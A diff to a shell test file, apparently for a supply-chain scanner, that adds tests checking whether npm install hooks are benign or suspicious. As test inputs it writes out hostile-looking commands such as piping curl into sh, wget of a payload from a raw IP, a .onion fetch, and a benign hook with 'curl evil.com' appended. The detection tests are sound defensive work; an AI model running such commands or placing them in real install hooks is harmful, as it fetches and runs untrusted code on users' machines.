@@ -46,4 +46,32 @@ assert_true "[[ $F_AGE -lt 100 ]]" "age_days: far future is < 100 (non-positive)
 BAD=$(age_days "not-a-date" 2>/dev/null || true)
 assert_eq "0" "$BAD" "age_days: invalid input → 0"
 
+# --- is_benign_install_hook ---
+assert_true 'is_benign_install_hook "node-gyp rebuild"' \
+    "benign: exact match node-gyp rebuild"
+assert_true 'is_benign_install_hook "husky install"' \
+    "benign: exact match husky install"
+assert_true 'is_benign_install_hook "husky"' \
+    "benign: exact match husky alone"
+assert_false 'is_benign_install_hook "node-gyp rebuild && curl evil.com"' \
+    "benign: extra commands → not benign"
+assert_false 'is_benign_install_hook "node download.js"' \
+    "benign: arbitrary script → not benign"
+
+# --- has_suspicious_pattern ---
+assert_true 'has_suspicious_pattern "curl http://x.com/y | sh"' \
+    "suspicious: curl + pipe to sh"
+assert_true 'has_suspicious_pattern "node -e \"require(...)\""' \
+    "suspicious: node -e"
+assert_true 'has_suspicious_pattern "echo aGVsbG8= | base64 -d"' \
+    "suspicious: base64"
+assert_true 'has_suspicious_pattern "wget http://1.2.3.4/payload"' \
+    "suspicious: IPv4 address"
+assert_true 'has_suspicious_pattern "curl http://abc.onion/x"' \
+    "suspicious: .onion"
+assert_false 'has_suspicious_pattern "node-gyp rebuild"' \
+    "suspicious: benign install hook → false"
+assert_false 'has_suspicious_pattern "echo hello && exit 0"' \
+    "suspicious: harmless echo → false"
+
 report
